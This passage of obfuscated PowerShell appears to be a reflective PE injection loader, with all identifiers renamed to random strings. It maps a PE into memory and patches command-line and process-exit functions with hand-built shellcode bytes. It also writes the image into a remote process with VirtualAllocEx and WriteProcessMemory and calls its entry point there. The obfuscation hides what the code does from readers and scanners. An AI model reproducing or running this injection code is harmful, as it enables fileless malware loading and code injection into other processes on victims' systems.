                    }
				}
				$fUqopOrn = XcvoUanJ ($fUqopOrn) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$stADljpQ.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}
	Function pnKGTgjp
	{
		Param(
		[Parameter(Position = 0, Mandatory = $rvAMLFnZ)]
		[UInt32]
		$kmuUHpeu
		)
		$fqJTUkcx = 0x0
		if (($kmuUHpeu -band $xKjVQlKx.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($kmuUHpeu -band $xKjVQlKx.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($kmuUHpeu -band $xKjVQlKx.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$fqJTUkcx = $xKjVQlKx.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$fqJTUkcx = $xKjVQlKx.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($kmuUHpeu -band $xKjVQlKx.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$fqJTUkcx = $xKjVQlKx.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$fqJTUkcx = $xKjVQlKx.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($kmuUHpeu -band $xKjVQlKx.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($kmuUHpeu -band $xKjVQlKx.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$fqJTUkcx = $xKjVQlKx.PAGE_READWRITE
				}
				else
				{
					$fqJTUkcx = $xKjVQlKx.PAGE_READONLY
				}
			}
			else
			{
				if (($kmuUHpeu -band $xKjVQlKx.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$fqJTUkcx = $xKjVQlKx.PAGE_WRITECOPY
				}
				else
				{
					$fqJTUkcx = $xKjVQlKx.PAGE_NOACCESS
				}
			}
		}
		if (($kmuUHpeu -band $xKjVQlKx.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$fqJTUkcx = $fqJTUkcx -bor $xKjVQlKx.PAGE_NOCACHE
		}
		return $fqJTUkcx
	}
	Function JozFxhzN
	{
		Param(
		[Parameter(Position = 0, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$brIcZJPz,
		[Parameter(Position = 1, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$gxNuhWuM,
		[Parameter(Position = 2, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$xKjVQlKx,
		[Parameter(Position = 3, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$stADljpQ
		)
		for( $EVqrncXK = 0; $EVqrncXK -lt $brIcZJPz.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $EVqrncXK++)
		{
			[IntPtr]$NCPxpTuU = [IntPtr](XcvoUanJ ([Int64]$brIcZJPz.SectionHeaderPtr) ($EVqrncXK * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$stADljpQ.IMAGE_SECTION_HEADER)))
			$CJFdELFH = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NCPxpTuU, [Type]$stADljpQ.IMAGE_SECTION_HEADER)
			[IntPtr]$DpFKOqUI = XcvoUanJ ($brIcZJPz.PEHandle) ($CJFdELFH.VirtualAddress)
			[UInt32]$HvoumzOz = pnKGTgjp $CJFdELFH.Characteristics
			[UInt32]$anjuIaFU = $CJFdELFH.VirtualSize
			[UInt32]$SGfXZibT = 0
			zCLXNXOI -DebugString "JozFxhzN::VirtualProtect" -PEInfo $brIcZJPz -StartAddress $DpFKOqUI -Size $anjuIaFU | Out-Null
			$UYYLFWoE = $gxNuhWuM.VirtualProtect.Invoke($DpFKOqUI, $anjuIaFU, $HvoumzOz, [Ref]$SGfXZibT)
			if ($UYYLFWoE -eq $WCARTiiv)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	Function WvoNPPfl
	{
		Param(
		[Parameter(Position = 0, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$brIcZJPz,
		[Parameter(Position = 1, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$gxNuhWuM,
		[Parameter(Position = 2, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$xKjVQlKx,
		[Parameter(Position = 3, Mandatory = $rvAMLFnZ)]
		[String]
		$mxfPGfYP,
		[Parameter(Position = 4, Mandatory = $rvAMLFnZ)]
		[IntPtr]
		$Trtreuxz
		)
		$xexuBLmF = @() 
		$cglPPIRl = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$SGfXZibT = 0
		[IntPtr]$DawHxPwx = $gxNuhWuM.GetModuleHandle.Invoke("Kernel32.dll")
		if ($DawHxPwx -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		[IntPtr]$tUjXEEdA = $gxNuhWuM.GetModuleHandle.Invoke("KernelBase.dll")
		if ($tUjXEEdA -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}
		$sWvJSXUp = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($mxfPGfYP)
		$CQvIVrAO = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($mxfPGfYP)
		[IntPtr]$hdRBavdw = $gxNuhWuM.GetProcAddress.Invoke($tUjXEEdA, "GetCommandLineA")
		[IntPtr]$rvVteIOQ = $gxNuhWuM.GetProcAddress.Invoke($tUjXEEdA, "GetCommandLineW")
		if ($hdRBavdw -eq [IntPtr]::Zero -or $rvVteIOQ -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(rbMuqydu $hdRBavdw). GetCommandLineW: $(rbMuqydu $rvVteIOQ)"
		}
		[Byte[]]$MNCyKTtM = @()
		if ($cglPPIRl -eq 8)
		{
			$MNCyKTtM += 0x48	
		}
		$MNCyKTtM += 0xb8
		[Byte[]]$jIXtqDev = @(0xc3)
		$rjRlYFUN = $MNCyKTtM.Length + $cglPPIRl + $jIXtqDev.Length
		$wjzwuDvh = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($rjRlYFUN)
		$IskCAIQT = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($rjRlYFUN)
		$gxNuhWuM.memcpy.Invoke($wjzwuDvh, $hdRBavdw, [UInt64]$rjRlYFUN) | Out-Null
		$gxNuhWuM.memcpy.Invoke($IskCAIQT, $rvVteIOQ, [UInt64]$rjRlYFUN) | Out-Null
		$xexuBLmF += ,($hdRBavdw, $wjzwuDvh, $rjRlYFUN)
		$xexuBLmF += ,($rvVteIOQ, $IskCAIQT, $rjRlYFUN)
		[UInt32]$SGfXZibT = 0
		$UYYLFWoE = $gxNuhWuM.VirtualProtect.Invoke($hdRBavdw, [UInt32]$rjRlYFUN, [UInt32]($xKjVQlKx.PAGE_EXECUTE_READWRITE), [Ref]$SGfXZibT)
		if ($UYYLFWoE = $WCARTiiv)
		{
			throw "Call to VirtualProtect failed"
		}
		$hdRBavdwTemp = $hdRBavdw
		SvvLofPM -Bytes $MNCyKTtM -MemoryAddress $hdRBavdwTemp
		$hdRBavdwTemp = XcvoUanJ $hdRBavdwTemp ($MNCyKTtM.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CQvIVrAO, $hdRBavdwTemp, $WCARTiiv)
		$hdRBavdwTemp = XcvoUanJ $hdRBavdwTemp $cglPPIRl
		SvvLofPM -Bytes $jIXtqDev -MemoryAddress $hdRBavdwTemp
		$gxNuhWuM.VirtualProtect.Invoke($hdRBavdw, [UInt32]$rjRlYFUN, [UInt32]$SGfXZibT, [Ref]$SGfXZibT) | Out-Null
		[UInt32]$SGfXZibT = 0
		$UYYLFWoE = $gxNuhWuM.VirtualProtect.Invoke($rvVteIOQ, [UInt32]$rjRlYFUN, [UInt32]($xKjVQlKx.PAGE_EXECUTE_READWRITE), [Ref]$SGfXZibT)
		if ($UYYLFWoE = $WCARTiiv)
		{
			throw "Call to VirtualProtect failed"
		}
		$rvVteIOQTemp = $rvVteIOQ
		SvvLofPM -Bytes $MNCyKTtM -MemoryAddress $rvVteIOQTemp
		$rvVteIOQTemp = XcvoUanJ $rvVteIOQTemp ($MNCyKTtM.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($sWvJSXUp, $rvVteIOQTemp, $WCARTiiv)
		$rvVteIOQTemp = XcvoUanJ $rvVteIOQTemp $cglPPIRl
		SvvLofPM -Bytes $jIXtqDev -MemoryAddress $rvVteIOQTemp
		$gxNuhWuM.VirtualProtect.Invoke($rvVteIOQ, [UInt32]$rjRlYFUN, [UInt32]$SGfXZibT, [Ref]$SGfXZibT) | Out-Null
		$TOcPVOWR = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		foreach ($WpQNGrWc in $TOcPVOWR)
		{
			[IntPtr]$WpQNGrWcHandle = $gxNuhWuM.GetModuleHandle.Invoke($WpQNGrWc)
			if ($WpQNGrWcHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$mSrGdvwl = $gxNuhWuM.GetProcAddress.Invoke($WpQNGrWcHandle, "_wcmdln")
				[IntPtr]$DbQcvmYo = $gxNuhWuM.GetProcAddress.Invoke($WpQNGrWcHandle, "_acmdln")
				if ($mSrGdvwl -eq [IntPtr]::Zero -or $DbQcvmYo -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				$xNHEXXEy = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($mxfPGfYP)
				$PDswXboK = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($mxfPGfYP)
				$kEpjAJxy = [System.Runtime.InteropServices.Marshal]::PtrToStructure($DbQcvmYo, [Type][IntPtr])
				$venZFPjt = [System.Runtime.InteropServices.Marshal]::PtrToStructure($mSrGdvwl, [Type][IntPtr])
				$kEpjAJxyStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($cglPPIRl)
				$venZFPjtStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($cglPPIRl)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($kEpjAJxy, $kEpjAJxyStorage, $WCARTiiv)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($venZFPjt, $venZFPjtStorage, $WCARTiiv)
				$xexuBLmF += ,($DbQcvmYo, $kEpjAJxyStorage, $cglPPIRl)
				$xexuBLmF += ,($mSrGdvwl, $venZFPjtStorage, $cglPPIRl)
				$UYYLFWoE = $gxNuhWuM.VirtualProtect.Invoke($DbQcvmYo, [UInt32]$cglPPIRl, [UInt32]($xKjVQlKx.PAGE_EXECUTE_READWRITE), [Ref]$SGfXZibT)
				if ($UYYLFWoE = $WCARTiiv)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($xNHEXXEy, $DbQcvmYo, $WCARTiiv)
				$gxNuhWuM.VirtualProtect.Invoke($DbQcvmYo, [UInt32]$cglPPIRl, [UInt32]($SGfXZibT), [Ref]$SGfXZibT) | Out-Null
				$UYYLFWoE = $gxNuhWuM.VirtualProtect.Invoke($mSrGdvwl, [UInt32]$cglPPIRl, [UInt32]($xKjVQlKx.PAGE_EXECUTE_READWRITE), [Ref]$SGfXZibT)
				if ($UYYLFWoE = $WCARTiiv)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($PDswXboK, $mSrGdvwl, $WCARTiiv)
				$gxNuhWuM.VirtualProtect.Invoke($mSrGdvwl, [UInt32]$cglPPIRl, [UInt32]($SGfXZibT), [Ref]$SGfXZibT) | Out-Null
			}
		}
		$xexuBLmF = @()
		$bKlAzlli = @() 
		[IntPtr]$acnkflnn = $gxNuhWuM.GetModuleHandle.Invoke("mscoree.dll")
		if ($acnkflnn -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$cJcqipPX = $gxNuhWuM.GetProcAddress.Invoke($acnkflnn, "CorExitProcess")
		if ($cJcqipPX -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$bKlAzlli += $cJcqipPX
		[IntPtr]$XrQgudHl = $gxNuhWuM.GetProcAddress.Invoke($DawHxPwx, "ExitProcess")
		if ($XrQgudHl -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$bKlAzlli += $XrQgudHl
		[UInt32]$SGfXZibT = 0
		foreach ($nqglbKLx in $bKlAzlli)
		{
			$nqglbKLxTmp = $nqglbKLx
			[Byte[]]$MNCyKTtM = @(0xbb)
			[Byte[]]$jIXtqDev = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			if ($cglPPIRl -eq 8)
			{
				[Byte[]]$MNCyKTtM = @(0x48, 0xbb)
				[Byte[]]$jIXtqDev = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$utpLZZgW = @(0xff, 0xd3)
			$rjRlYFUN = $MNCyKTtM.Length + $cglPPIRl + $jIXtqDev.Length + $cglPPIRl + $utpLZZgW.Length
			[IntPtr]$DEkmrMQO = $gxNuhWuM.GetProcAddress.Invoke($DawHxPwx, "ExitThread")
			if ($DEkmrMQO -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}
			$UYYLFWoE = $gxNuhWuM.VirtualProtect.Invoke($nqglbKLx, [UInt32]$rjRlYFUN, [UInt32]$xKjVQlKx.PAGE_EXECUTE_READWRITE, [Ref]$SGfXZibT)
			if ($UYYLFWoE -eq $WCARTiiv)
			{
				Throw "Call to VirtualProtect failed"
			}
			$ibylSFIu = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($rjRlYFUN)
			$gxNuhWuM.memcpy.Invoke($ibylSFIu, $nqglbKLx, [UInt64]$rjRlYFUN) | Out-Null
			$xexuBLmF += ,($nqglbKLx, $ibylSFIu, $rjRlYFUN)
			SvvLofPM -Bytes $MNCyKTtM -MemoryAddress $nqglbKLxTmp
			$nqglbKLxTmp = XcvoUanJ $nqglbKLxTmp ($MNCyKTtM.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($Trtreuxz, $nqglbKLxTmp, $WCARTiiv)
			$nqglbKLxTmp = XcvoUanJ $nqglbKLxTmp $cglPPIRl
			SvvLofPM -Bytes $jIXtqDev -MemoryAddress $nqglbKLxTmp
			$nqglbKLxTmp = XcvoUanJ $nqglbKLxTmp ($jIXtqDev.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($DEkmrMQO, $nqglbKLxTmp, $WCARTiiv)
			$nqglbKLxTmp = XcvoUanJ $nqglbKLxTmp $cglPPIRl
			SvvLofPM -Bytes $utpLZZgW -MemoryAddress $nqglbKLxTmp
			$gxNuhWuM.VirtualProtect.Invoke($nqglbKLx, [UInt32]$rjRlYFUN, [UInt32]$SGfXZibT, [Ref]$SGfXZibT) | Out-Null
		}
		Write-Output $xexuBLmF
	}
	Function nJzZpzXJ
	{
		Param(
		[Parameter(Position = 0, Mandatory = $rvAMLFnZ)]
		[Array[]]
		$isEQeljs,
		[Parameter(Position = 1, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$gxNuhWuM,
		[Parameter(Position = 2, Mandatory = $rvAMLFnZ)]
		[System.Object]
		$xKjVQlKx
		)
		[UInt32]$SGfXZibT = 0
		foreach ($nSmtzjue in $isEQeljs)
		{
			$UYYLFWoE = $gxNuhWuM.VirtualProtect.Invoke($nSmtzjue[0], [UInt32]$nSmtzjue[2], [UInt32]$xKjVQlKx.PAGE_EXECUTE_READWRITE, [Ref]$SGfXZibT)
			if ($UYYLFWoE -eq $WCARTiiv)
			{
				Throw "Call to VirtualProtect failed"
			}
			$gxNuhWuM.memcpy.Invoke($nSmtzjue[0], $nSmtzjue[1], [UInt64]$nSmtzjue[2]) | Out-Null
			$gxNuhWuM.VirtualProtect.Invoke($nSmtzjue[0], [UInt32]$nSmtzjue[2], [UInt32]$SGfXZibT, [Ref]$SGfXZibT) | Out-Null
		}
	}
	Function jJHaPlNS
	{
		Param(
		[Parameter(Position = 0, Mandatory = $rvAMLFnZ)]
		[IntPtr]
		$QuNkENTk,
		[Parameter(Position = 1, Mandatory = $rvAMLFnZ)]
		[String]
		$PlDRtSek
		)
		$stADljpQ = WLBtrRfq
		$xKjVQlKx = KuaRSZmc
		$brIcZJPz = TBNBnYHB -PEHandle $QuNkENTk -Win32Types $stADljpQ -Win32Constants $xKjVQlKx
		if ($brIcZJPz.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$pfaKxqwb = XcvoUanJ ($QuNkENTk) ($brIcZJPz.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$dJkziMxf = [System.Runtime.InteropServices.Marshal]::PtrToStructure($pfaKxqwb, [Type]$stADljpQ.IMAGE_EXPORT_DIRECTORY)
		for ($EVqrncXK = 0; $EVqrncXK -lt $dJkziMxf.NumberOfNames; $EVqrncXK++)
		{
			$FDKHhHCs = XcvoUanJ ($QuNkENTk) ($dJkziMxf.AddressOfNames + ($EVqrncXK * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$DzlsBYnw = XcvoUanJ ($QuNkENTk) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($FDKHhHCs, [Type][UInt32]))
			$FzuYWFzn = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($DzlsBYnw)
			if ($FzuYWFzn -ceq $PlDRtSek)
			{
				$PPbUeYlK = XcvoUanJ ($QuNkENTk) ($dJkziMxf.AddressOfNameOrdinals + ($EVqrncXK * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$sQnRHonp = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PPbUeYlK, [Type][UInt16])
				$bJGxOoKN = XcvoUanJ ($QuNkENTk) ($dJkziMxf.AddressOfFunctions + ($sQnRHonp * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$tWhfffxk = [System.Runtime.InteropServices.Marshal]::PtrToStructure($bJGxOoKN, [Type][UInt32])
				return XcvoUanJ ($QuNkENTk) ($tWhfffxk)
			}
		}
		return [IntPtr]::Zero
	}
	Function MwrGtgXJ
	{
		Param(
		[Parameter( Position = 0, Mandatory = $rvAMLFnZ )]
		[Byte[]]
		$YyOqIfFM,
		[Parameter(Position = 1, Mandatory = $WCARTiiv)]
		[String]
		$mvGmwgqS,
		[Parameter(Position = 2, Mandatory = $WCARTiiv)]
		[IntPtr]
		$ecUUHIyn,
        [Parameter(Position = 3)]
        [Bool]
        $XEIOQxss = $WCARTiiv
		)
		$cglPPIRl = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$xKjVQlKx = KuaRSZmc
		$gxNuhWuM = KoDoDYXx
		$stADljpQ = WLBtrRfq
		$awpbvApR = $WCARTiiv
		if (($ecUUHIyn -ne $buwbSEkt) -and ($ecUUHIyn -ne [IntPtr]::Zero))
		{
			$awpbvApR = $rvAMLFnZ
		}
		Write-Verbose "Getting basic PE information from the file"
		$brIcZJPz = RfEIvrYp -PEBytes $YyOqIfFM -Win32Types $stADljpQ
		$GAgtPQHO = $brIcZJPz.OriginalImageBase
		$TBgotAAk = $rvAMLFnZ
		if (($brIcZJPz.DllCharacteristics -band $xKjVQlKx.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $xKjVQlKx.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$TBgotAAk = $WCARTiiv
		}
		$oIknyTcg = $rvAMLFnZ
		if ($awpbvApR -eq $rvAMLFnZ)
		{
			$DawHxPwx = $gxNuhWuM.GetModuleHandle.Invoke("kernel32.dll")
			$mGWEuovT = $gxNuhWuM.GetProcAddress.Invoke($DawHxPwx, "IsWow64Process")
			if ($mGWEuovT -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			[Bool]$YSGRsHEW = $WCARTiiv
			$UYYLFWoE = $gxNuhWuM.IsWow64Process.Invoke($ecUUHIyn, [Ref]$YSGRsHEW)
			if ($UYYLFWoE -eq $WCARTiiv)
			{
				Throw "Call to IsWow64Process failed"
			}
			if (($YSGRsHEW -eq $rvAMLFnZ) -or (($YSGRsHEW -eq $WCARTiiv) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$oIknyTcg = $WCARTiiv
			}
			$yxbwFeFh = $rvAMLFnZ
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$yxbwFeFh = $WCARTiiv
			}
			if ($yxbwFeFh -ne $oIknyTcg)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$oIknyTcg = $WCARTiiv
			}
		}
		if ($oIknyTcg -ne $brIcZJPz.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		[IntPtr]$jzaNxSuo = [IntPtr]::Zero
        $PGxxQRmv = ($brIcZJPz.DllCharacteristics -band $xKjVQlKx.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $xKjVQlKx.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $XEIOQxss) -and (-not $PGxxQRmv))
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
			[IntPtr]$jzaNxSuo = $GAgtPQHO
		}
        elseif ($XEIOQxss -and (-not $PGxxQRmv))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }
        if ($XEIOQxss -and $awpbvApR)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($awpbvApR -and (-not $PGxxQRmv))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }
		$QuNkENTk = [IntPtr]::Zero				
		$mwuohHkv = [IntPtr]::Zero		
		if ($awpbvApR -eq $rvAMLFnZ)
		{
			$QuNkENTk = $gxNuhWuM.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$brIcZJPz.SizeOfImage, $xKjVQlKx.MEM_COMMIT -bor $xKjVQlKx.MEM_RESERVE, $xKjVQlKx.PAGE_READWRITE)
			$mwuohHkv = $gxNuhWuM.VirtualAllocEx.Invoke($ecUUHIyn, $jzaNxSuo, [UIntPtr]$brIcZJPz.SizeOfImage, $xKjVQlKx.MEM_COMMIT -bor $xKjVQlKx.MEM_RESERVE, $xKjVQlKx.PAGE_EXECUTE_READWRITE)
			if ($mwuohHkv -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($TBgotAAk -eq $rvAMLFnZ)
			{
				$QuNkENTk = $gxNuhWuM.VirtualAlloc.Invoke($jzaNxSuo, [UIntPtr]$brIcZJPz.SizeOfImage, $xKjVQlKx.MEM_COMMIT -bor $xKjVQlKx.MEM_RESERVE, $xKjVQlKx.PAGE_READWRITE)
			}
			else
			{
				$QuNkENTk = $gxNuhWuM.VirtualAlloc.Invoke($jzaNxSuo, [UIntPtr]$brIcZJPz.SizeOfImage, $xKjVQlKx.MEM_COMMIT -bor $xKjVQlKx.MEM_RESERVE, $xKjVQlKx.PAGE_EXECUTE_READWRITE)
			}
			$mwuohHkv = $QuNkENTk
		}
		[IntPtr]$FEefZsFv = XcvoUanJ ($QuNkENTk) ([Int64]$brIcZJPz.SizeOfImage)
		if ($QuNkENTk -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($YyOqIfFM, 0, $QuNkENTk, $brIcZJPz.SizeOfHeaders) | Out-Null
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$brIcZJPz = TBNBnYHB -PEHandle $QuNkENTk -Win32Types $stADljpQ -Win32Constants $xKjVQlKx
		$brIcZJPz | Add-Member -MemberType NoteProperty -Name EndAddress -Value $FEefZsFv
		$brIcZJPz | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $mwuohHkv
		Write-Verbose "StartAddress: $(rbMuqydu $QuNkENTk)    EndAddress: $(rbMuqydu $FEefZsFv)"
		Write-Verbose "Copy PE sections in to memory"
		uVzUIyHr -PEBytes $YyOqIfFM -PEInfo $brIcZJPz -Win32Functions $gxNuhWuM -Win32Types $stADljpQ
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		wvoBiEAy -PEInfo $brIcZJPz -OriginalImageBase $GAgtPQHO -Win32Constants $xKjVQlKx -Win32Types $stADljpQ
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($awpbvApR -eq $rvAMLFnZ)
		{
			RjJclWrf -PEInfo $brIcZJPz -Win32Functions $gxNuhWuM -Win32Types $stADljpQ -Win32Constants $xKjVQlKx -RemoteProcHandle $ecUUHIyn
		}
		else
		{
			RjJclWrf -PEInfo $brIcZJPz -Win32Functions $gxNuhWuM -Win32Types $stADljpQ -Win32Constants $xKjVQlKx
		}
		if ($awpbvApR -eq $WCARTiiv)
		{
			if ($TBgotAAk -eq $rvAMLFnZ)
			{
				Write-Verbose "Update memory protection flags"
				JozFxhzN -PEInfo $brIcZJPz -Win32Functions $gxNuhWuM -Win32Constants $xKjVQlKx -Win32Types $stADljpQ
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		if ($awpbvApR -eq $rvAMLFnZ)
		{
			[UInt32]$oukMtmgo = 0
			$UYYLFWoE = $gxNuhWuM.WriteProcessMemory.Invoke($ecUUHIyn, $mwuohHkv, $QuNkENTk, [UIntPtr]($brIcZJPz.SizeOfImage), [Ref]$oukMtmgo)
			if ($UYYLFWoE -eq $WCARTiiv)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		if ($brIcZJPz.FileType -ieq "DLL")
		{
			if ($awpbvApR -eq $WCARTiiv)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$WpQNGrWcoeofTvpwPtr = XcvoUanJ ($brIcZJPz.PEHandle) ($brIcZJPz.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$WpQNGrWcoeofTvpwDelegate = OThsxKhu @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$WpQNGrWcoeofTvpw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WpQNGrWcoeofTvpwPtr, $WpQNGrWcoeofTvpwDelegate)
				$WpQNGrWcoeofTvpw.Invoke($brIcZJPz.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$WpQNGrWcoeofTvpwPtr = XcvoUanJ ($mwuohHkv) ($brIcZJPz.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				if ($brIcZJPz.PE64Bit -eq $rvAMLFnZ)
				{
					$mpybaWqC = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$YFkjoOyg = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$fUGPACkG = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					$mpybaWqC = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$YFkjoOyg = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$fUGPACkG = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$FhfbCDRv = $mpybaWqC.Length + $YFkjoOyg.Length + $fUGPACkG.Length + ($cglPPIRl * 2)
				$gKkRrEWc = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($FhfbCDRv)
				$gKkRrEWcOriginal = $gKkRrEWc
				SvvLofPM -Bytes $mpybaWqC -MemoryAddress $gKkRrEWc
				$gKkRrEWc = XcvoUanJ $gKkRrEWc ($mpybaWqC.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($mwuohHkv, $gKkRrEWc, $WCARTiiv)
				$gKkRrEWc = XcvoUanJ $gKkRrEWc ($cglPPIRl)
				SvvLofPM -Bytes $YFkjoOyg -MemoryAddress $gKkRrEWc
				$gKkRrEWc = XcvoUanJ $gKkRrEWc ($YFkjoOyg.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($WpQNGrWcoeofTvpwPtr, $gKkRrEWc, $WCARTiiv)
				$gKkRrEWc = XcvoUanJ $gKkRrEWc ($cglPPIRl)
				SvvLofPM -Bytes $fUGPACkG -MemoryAddress $gKkRrEWc
				$gKkRrEWc = XcvoUanJ $gKkRrEWc ($fUGPACkG.Length)
